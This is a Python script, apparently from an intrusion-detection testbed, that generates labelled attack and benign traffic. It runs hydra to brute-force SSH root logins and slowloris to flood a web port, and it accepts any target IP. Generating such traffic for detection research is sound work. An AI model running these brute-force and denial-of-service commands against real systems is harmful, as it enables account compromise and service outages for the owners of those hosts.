"""
attack_flow.py — Offensive traffic simulation utility for FL-CL testbed.

Runs on: Traffic Generator VM (VM 400)
"""
import argparse
import subprocess
import time
import requests


def run_ssh_brute(target, duration):
    print(f"[*] Starting SSH Brute Force attack on {target} for {duration}s...")
    # Use fasttrack.txt since it is uncompressed on Kali by default
    cmd = f"hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://{target} -t 4"
    proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(duration)
    proc.terminate()
    print("[*] SSH Brute Force completed/terminated.")


def run_slowloris(target, duration, port=80):
    print(f"[*] Starting Slowloris DoS on {target}:{port} for {duration}s...")
    cmd = f"slowloris {target} -p {port} -s 100"
    proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(duration)
    proc.terminate()
    print("[*] Slowloris DoS completed/terminated.")


def run_benign(target, duration):
    print(f"[*] Starting Benign background traffic to {target} for {duration}s...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            # Send HTTP requests to target's busybox httpd
            requests.get(f"http://{target}:80/", timeout=1)
        except Exception:
            pass
        time.sleep(0.5)
    print("[*] Benign background traffic completed.")


def main():
    parser = argparse.ArgumentParser(description="FL-CL Attack Flow Generator")
    parser.add_argument("--mode", choices=["ssh", "slowloris", "benign"], required=True)
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--duration", type=int, default=30, help="Duration of attack in seconds")
    parser.add_argument("--port", type=int, default=80, help="Target port for Slowloris")
    args = parser.parse_args()

    if args.mode == "ssh":
        run_ssh_brute(args.target, args.duration)
    elif args.mode == "slowloris":
        run_slowloris(args.target, args.duration, args.port)
    elif args.mode == "benign":
        run_benign(args.target, args.duration)


if __name__ == "__main__":
    main()
